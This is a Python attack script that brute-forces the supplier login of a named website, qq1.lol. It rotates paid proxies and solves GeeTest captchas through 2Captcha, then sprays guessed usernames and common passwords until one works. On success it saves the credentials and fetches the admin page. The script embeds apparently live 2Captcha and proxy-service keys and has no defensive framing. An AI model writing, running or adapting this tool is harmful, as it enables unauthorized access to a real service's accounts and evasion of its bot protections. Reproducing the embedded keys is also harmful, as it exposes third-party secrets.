#!/usr/bin/env python3
"""qq1.lol /sup 2Captcha brute — optimized: 1 solve → spray until captcha dies."""
import json
import subprocess
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_sup")
OUT.mkdir(exist_ok=True)
LOG = OUT / "sup_2captcha.log"
HITS = OUT / "sup_hits.txt"
PROGRESS = OUT / "sup_progress.json"
JAR = str(OUT / "cookies.jar")
CAPTCHA2_KEY = "685ea1068774ca8f8e9a292a08da66d6"
QG, PW = "C413ED6D", "344F550A6F8B"
PAGE = f"{BASE}/sup/login.php"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"

# priority users first
USERS = [
    "admin", "buyi", "buyiq", "qqkqq", "qq1", "sup", "supplier", "root",
    "布衣", "faka", "test", "qqkzc", "agent", "daili", "vip", "user",
    "demo", "administrator", "manager", "gonghuo", "gh", "super", "ka1",
]
PASSWORDS = [
    "123456", "admin123", "admin888", "admin666", "admin", "123456789",
    "buyi123", "buyi888", "buyi666", "buyi", "buyiq", "buyi2025", "buyi2026",
    "qq123456", "qq1", "qqkqq", "qqkqq123", "888888", "666666", "111111",
    "password", "admin@123", "Admin123", "a123456", "123123", "12345678",
    "root", "test123", "abc123", "830603", "Aa123456", "1qaz2wsx",
    "admin2025", "admin2026", "sup123", "supplier", "faka123", "qwerty",
    "000000", "654321", "pass123", "88888888", "qwer1234", "buyi520",
    "qq1admin", "qq1.lol", "ka1.one", "QQKZC", "布衣", "发卡",
]

_px = None
_fail = 0


def log(m):
    line = f"[{datetime.now():%H:%M:%S}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(u, p, body=""):
    open(HITS, "a").write(f"{u}:{p}\n{body}\n")
    log(f"*** HIT {u}:{p} ***")


def proxy(force=False):
    global _px, _fail
    if _px and not force and _fail < 3:
        return _px
    servers = []
    try:
        d = json.loads(subprocess.check_output(
            ["curl", "-s", "--max-time", "10", f"https://share.proxy.qg.net/query?key={QG}"],
            text=True, timeout=12))
        servers = [x["server"] for x in (d.get("data") or [])]
    except Exception:
        pass
    if not servers or force:
        time.sleep(1.5)
        try:
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "--max-time", "10",
                 f"https://share.proxy.qg.net/get?key={QG}&num=2&area=440000"],
                text=True, timeout=12))
            if d.get("code") == "SUCCESS":
                servers = [x["server"] for x in d["data"]] + servers
        except Exception:
            pass
    for s in servers:
        cand = f"http://{QG}:{PW}@{s}"
        code = subprocess.run(
            ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/dev/null",
             "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
            capture_output=True, text=True, timeout=14).stdout.strip()
        if code == "200":
            _px, _fail = cand, 0
            log(f"proxy {s}")
            return _px
    return _px


def curl(url, post=None, mt=16, tries=4):
    global _fail
    for _ in range(tries):
        px = proxy()
        if not px:
            time.sleep(2)
            proxy(True)
            continue
        cmd = ["curl", "-sk", "--max-time", str(mt), "-x", px, "-b", JAR, "-c", JAR,
               "-A", UA, "-H", f"Referer: {PAGE}", "-H", "X-Requested-With: XMLHttpRequest",
               "-w", "\n__HTTP:%{http_code}"]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 5).stdout or ""
        except Exception:
            out = ""
        if "__HTTP:" not in out:
            _fail += 1
            proxy(True)
            continue
        b, code = out.rsplit("__HTTP:", 1)
        if code.strip() == "200" and b.strip():
            return b.strip()
        _fail += 1
        proxy(True)
    return ""


def balance():
    try:
        d = json.loads(subprocess.check_output(
            ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
             "-d", json.dumps({"clientKey": CAPTCHA2_KEY}),
             "https://api.2captcha.com/getBalance"], text=True, timeout=20))
        return d.get("balance", 0)
    except Exception:
        return -1


def get_gt():
    Path(JAR).unlink(missing_ok=True)
    curl(PAGE)
    body = curl(f"{BASE}/ajax.php?act=captcha&t={int(time.time()*1000)}")
    d = json.loads(body)
    if not d.get("gt") or not d.get("challenge"):
        raise RuntimeError(f"bad gt: {body[:120]}")
    return d


def solve(gt, challenge):
    t0 = time.time()
    task = {"type": "GeeTestTaskProxyless", "websiteURL": PAGE, "gt": gt, "challenge": challenge}
    d = json.loads(subprocess.check_output(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
         "-d", json.dumps({"clientKey": CAPTCHA2_KEY, "task": task}),
         "https://api.2captcha.com/createTask"], text=True, timeout=35))
    if d.get("errorId"):
        raise RuntimeError(f"create: {d}")
    tid = d["taskId"]
    log(f"  task={tid}")
    for _ in range(30):
        time.sleep(4)
        d = json.loads(subprocess.check_output(
            ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
             "-d", json.dumps({"clientKey": CAPTCHA2_KEY, "taskId": tid}),
             "https://api.2captcha.com/getTaskResult"], text=True, timeout=25))
        if d.get("errorId"):
            raise RuntimeError(f"poll: {d}")
        if d.get("status") == "ready":
            sol = d["solution"]
            log(f"  solved {time.time()-t0:.0f}s")
            return {
                "challenge": sol.get("challenge") or challenge,
                "validate": sol.get("validate", ""),
                "seccode": sol.get("seccode") or (sol.get("validate", "") + "|jordan"),
            }
    raise RuntimeError("timeout")


def login(user, pwd, geo):
    body = curl(f"{BASE}/sup/ajax.php?act=login", {
        "user": user, "pass": pwd,
        "geetest_challenge": geo["challenge"],
        "geetest_validate": geo["validate"],
        "geetest_seccode": geo["seccode"],
    })
    if not body:
        return {"msg": "empty"}
    try:
        return json.loads(body)
    except Exception:
        return {"msg": body[:80]}


def save(ui, pi):
    PROGRESS.write_text(json.dumps({"ui": ui, "pi": pi, "ts": datetime.now().isoformat()}))


def main():
    open(LOG, "w").write("")
    bal = balance()
    log(f"=== START bal={bal} users={len(USERS)} pwds={len(PASSWORDS)} ===")
    if not isinstance(bal, (int, float)) or bal <= 0:
        log("no balance"); return
    if not proxy(True):
        log("no proxy"); return

    prog = {}
    if PROGRESS.exists():
        try:
            prog = json.loads(PROGRESS.read_text())
        except Exception:
            pass
    ui0, pi0 = prog.get("ui", 0), prog.get("pi", 0)
    tested = 0
    solves = 0

    for ui in range(ui0, len(USERS)):
        user = USERS[ui]
        pi = pi0 if ui == ui0 else 0
        while pi < len(PASSWORDS):
            log(f"--- {user} from pwd#{pi} ---")
            try:
                proxy()
                cap = get_gt()
                geo = solve(cap["gt"], cap["challenge"])
                solves += 1
            except Exception as e:
                log(f"  captcha err: {e}")
                if "ZERO_BALANCE" in str(e):
                    return
                time.sleep(5)
                continue

            # spray until captcha expires
            while pi < len(PASSWORDS):
                pwd = PASSWORDS[pi]
                resp = login(user, pwd, geo)
                msg = str(resp.get("msg") or "")
                code = resp.get("code")
                tested += 1
                if code == 0 or "成功" in msg:
                    hit(user, pwd, json.dumps(resp, ensure_ascii=False))
                    (OUT / "sup_home.html").write_text(curl(f"{BASE}/sup/") or "", errors="replace")
                    log(f"DONE hit solves={solves} tested={tested} bal={balance()}")
                    return
                if "密码" in msg or "用户名" in msg or "不正确" in msg or "不存在" in msg:
                    log(f"  {user}:{pwd} wrong")
                    pi += 1
                    save(ui, pi)
                    time.sleep(0.08)
                    continue
                if "验证" in msg or "请先完成" in msg:
                    log(f"  captcha expired at {user}:{pwd}")
                    break  # same pi, new captcha
                log(f"  {user}:{pwd} -> {msg[:50] or resp}")
                pi += 1
                save(ui, pi)
                if "empty" in msg:
                    proxy(True)
                    break
            else:
                # finished all pwds for user
                break
        pi0 = 0
        save(ui + 1, 0)
        log(f"user {user} done, bal={balance()}")

    log(f"=== NO HIT solves={solves} tested={tested} bal={balance()} ===")


if __name__ == "__main__":
    main()
